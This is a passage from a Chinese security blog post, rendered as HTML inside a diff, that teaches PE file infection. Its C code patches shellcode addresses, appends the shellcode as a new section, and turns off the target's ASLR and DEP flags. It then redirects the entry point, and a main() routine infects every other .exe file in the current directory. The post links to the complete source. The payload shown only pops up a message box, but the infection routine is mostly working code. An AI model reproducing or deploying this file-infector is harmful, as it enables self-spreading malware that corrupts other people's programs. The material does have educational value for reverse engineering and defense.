+<p>大多数程序都会加载 user32.dll， 并且在同一系统中，user32.dll 会被加载到自身固有的 ImageBase，而 MessageBoxA 是该动态链接库的一个导出函数，所以同一系统中运行的所有进程的 MessageBoxA 函数地址是相同的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//动态获取 MessageBoxA 函数地址</span></div><div class="line">	HMODULE hModule = LoadLibraryA(<span class="string">"user32.dll"</span>);</div><div class="line">	LPVOID lpAddress = GetProcAddress(hModule, <span class="string">"MessageBoxA"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//修改 shellcode 中 MessabeBoxA 和 OEP 的地址</span></div><div class="line">	HANDLE hHeap = HeapCreate(<span class="literal">NULL</span>,<span class="literal">NULL</span>,dwCodeSize);</div><div class="line">	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);</div><div class="line">	<span class="built_in">memcpy</span>(lpHeap,ShellcodeStart,dwCodeSize);</div><div class="line"></div><div class="line">	DWORD dwIncrementor = <span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(;dwIncrementor &lt; dwCodeSize; dwIncrementor++)&#123;</div><div class="line">		<span class="comment">//修改 MessageBoxA 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xAAAAAAAA</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//修改原 OEP 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xBBBBBBBB</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;</div><div class="line">			FreeLibrary(hModule);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//复制shellcode到新节区</span></div><div class="line">	DWORD dwSize = <span class="number">0</span>;</div><div class="line">	SetFilePointer(hFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FILE_END);</div><div class="line">	WriteFile(hFile,lpHeap,pNewSec-&gt;SizeOfRawData,&amp;dwSize,<span class="literal">NULL</span>);</div><div class="line">	HeapFree(hHeap,<span class="literal">NULL</span>,lpHeap);</div><div class="line">	HeapDestroy(hHeap);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>修正 Shellcode 中地址之后将其复制到 PE 文件的末尾，首先使用 SetFilePointer() 函数将文件指针指向文件末尾，再通过 WriteFile() 函数将 Shellcode 函数写入文件。SetFilePointer() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">DWORD WINAPI <span class="title">SetFilePointer</span><span class="params">(</span></span></div><div class="line">	HANDLE hFile, <span class="comment">//A handle to the file</span></div><div class="line"> 	LONG   lDistanceToMove,</div><div class="line"> 	PLONG  lpDistanceToMoveHigh,</div><div class="line"> 	DWORD  dwMoveMethod <span class="comment">//The starting point for the file pointer move</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
+<h4 id="5）关闭目标程序-ASLR"><a href="#5）关闭目标程序-ASLR" class="headerlink" title="5）关闭目标程序 ASLR"></a><strong>5）关闭目标程序 ASLR</strong></h4><p>由于 Shellcode 中 MessageBoxA() 函数地址和原 OEP 都是硬编码的，而在 Windows Vista 系统开始都默认启用 ASLR，所以目标程序每次启动时加载到内存的地址(ImageBase)都不同，导致 Shellcode 在跳转至原入口地址时因地址错误而不能正常执行。</p>
+<p>普通的 EXE 文件不存在 .reloc 节区，编译器默认情况下都启用 ASLR（“目属性/链接器/高级/随机基址” 可关闭 ASLR），所以编译生成的可执行文件会包含用于重定位的 .reloc 节区。PE 文件中与 ASLR 相关的字段主要有以下几个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IMAGE_FILE_HEADER/Characteristics：关闭 ASLR 时才设置 IMAGE_FILE_RELOCS_STRIPPED 属性值    </div><div class="line">IMAGE_OPTIONAL_HEADER/DllCharacteristics：开启 ASLR 时才设置 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 属性值</div><div class="line">IMAGE_OPTIONAL_HEADER/DataDirectory[5]：该字段为 Base Relocation Table，ASLR 关闭时该字段值为 0。</div></pre></td></tr></table></figure></p>
+<p>下面通过编程的方式关闭目标程序的 ASLR：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//关闭目标程序 ASLR</span></div><div class="line">	pNTHdr-&gt;FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span>;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span>;</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>注：<br>IMAGE_OPTIONAL_HEADER/DllCharacteristics 中 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 为与 DEP 相关的属性值，开启 DEP 时会设置改属性值，同样可以用以下代码关闭目标程序的 DEP：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;</div></pre></td></tr></table></figure></p>
+<h4 id="6）修改入口地址-OEP"><a href="#6）修改入口地址-OEP" class="headerlink" title="6）修改入口地址 OEP"></a><strong>6）修改入口地址 OEP</strong></h4><p>为了让新添加节区中的代码获得优先执行权，要把程序的入口地址设置为新节区的起始地址，即新节表中 VirtualAddress 的值。修改完后调用 FlushViewOfFile() 函数将对文件的修改写入到磁盘中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line"> 	...</div><div class="line">	<span class="comment">//设置新增节区起始地址为新的入口地址</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewSec-&gt;VirtualAddress;</div><div class="line"></div><div class="line">	FlushViewOfFile(pHdr,pNTHdr-&gt;OptionalHeader.SizeOfHeaders);</div><div class="line">	UnmapViewOfFile(pHdr);</div><div class="line">	CloseHandle(hMapFile);</div><div class="line">	CloseHandle(hFile);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="6）测试"><a href="#6）测试" class="headerlink" title="6）测试"></a><strong>6）测试</strong></h4><p>以下代码遍历当前目录下所有.exe 文件，并感染除程序自身外的所有.exe文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	WIN32_FIND_DATA FileInfo;</div><div class="line">	HANDLE hListFile;</div><div class="line">	TCHAR szFilePath[MAX_PATH];</div><div class="line">	TCHAR szCurrentPath[MAX_PATH];</div><div class="line">	TCHAR szCurrentModule[MAX_PATH];</div><div class="line"></div><div class="line">	<span class="comment">//获取当前目录</span></div><div class="line">	GetCurrentDirectory(MAX_PATH,szCurrentPath);</div><div class="line">	<span class="comment">//获取当前模块路径</span></div><div class="line">	GetModuleFileName(<span class="literal">NULL</span>,szCurrentModule,MAX_PATH);</div><div class="line">	lstrcpy(szFilePath,szCurrentPath);</div><div class="line">	lstrcat(szFilePath,<span class="string">L"\\*.exe"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//遍历当前目录并感染除自身外的所有.exe文件</span></div><div class="line">	hListFile = FindFirstFile(szFilePath,&amp;FileInfo);</div><div class="line">	<span class="keyword">if</span>(hListFile == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">do</span>&#123;</div><div class="line">			<span class="keyword">if</span>(!_tcsstr(szCurrentModule,FileInfo.cFileName))&#123;</div><div class="line">				<span class="comment">//感染目标文件</span></div><div class="line">				<span class="keyword">if</span> (!InfectFile(FileInfo.cFileName))&#123;</div><div class="line">					<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="keyword">while</span>(FindNextFile(hListFile,&amp;FileInfo));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-23/33815689.jpg" alt=""></p>
+<p>完整代码可以在 <a href="https://github.com/0x4C43/InflectPE" target="_blank" rel="external">此链接</a> 下载。</p>
+<hr>
+<p>References:<br>[1] <a href="https://0x00sec.org/t/pe-file-infection/401" target="_blank" rel="external">PE File Infection</a><br>[2] 《小小黑客之路》<br>[3] 《黑客编辑揭秘与防范》<br>[4] 《逆向工程核心原理》</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PE文件/" rel="tag"># PE文件</a>
+          
+            <a href="/tags/添加节区/" rel="tag"># 添加节区</a>
+          
+            <a href="/tags/病毒感染/" rel="tag"># 病毒感染</a>
+          
+            <a href="/tags/打补丁/" rel="tag"># 打补丁</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/在斐讯 K2 上安装 kcptun/" rel="next" title="在斐讯 K2 上部署 Shadowsocks+Kcptun">
+                <i class="fa fa-chevron-left"></i> 在斐讯 K2 上部署 Shadowsocks+Kcptun
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/使用firmware-mod-kit修改固件/" rel="prev" title="使用 firmware-mod-kit 修改固件">
+                使用 firmware-mod-kit 修改固件 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="0x4C43" />
+          <p class="site-author-name" itemprop="name">0x4C43</p>
+           
+              <p class="site-description motion-element" itemprop="description">Reverse&Pwn</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/0x4C43" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.csdn.net/swjtu100?viewmode=list" title="CSDN" target="_blank" rel="external nofollow">CSDN</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-手动添加"><span class="nav-number">1.</span> <span class="nav-text">0x01 手动添加</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1）添加一个-IMAGE-SECTION-HEADER"><span class="nav-number">1.1.</span> <span class="nav-text">1）添加一个 IMAGE_SECTION_HEADER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2）修改-NumberOfSection"><span class="nav-number">1.2.</span> <span class="nav-text">2）修改 NumberOfSection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3）修改-SizeOfImage"><span class="nav-number">1.3.</span> <span class="nav-text">3）修改 SizeOfImage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4）添加节区数据"><span class="nav-number">1.4.</span> <span class="nav-text">4）添加节区数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-编程实现"><span class="nav-number">2.</span> <span class="nav-text">0x02 编程实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1）将文件映射到内存"><span class="nav-number">2.1.</span> <span class="nav-text">1）将文件映射到内存</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2）检查-PE-文件"><span class="nav-number">2.2.</span> <span class="nav-text">2）检查 PE 文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3）添加节表"><span class="nav-number">2.3.</span> <span class="nav-text">3）添加节表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4）插入节区数据"><span class="nav-number">2.4.</span> <span class="nav-text">4）插入节区数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5）关闭目标程序-ASLR"><span class="nav-number">2.5.</span> <span class="nav-text">5）关闭目标程序 ASLR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6）修改入口地址-OEP"><span class="nav-number">2.6.</span> <span class="nav-text">6）修改入口地址 OEP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6）测试"><span class="nav-number">2.7.</span> <span class="nav-text">6）测试</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0x4C43</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "c190dfc84c3444f78b4a39fbfe45d4ee",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
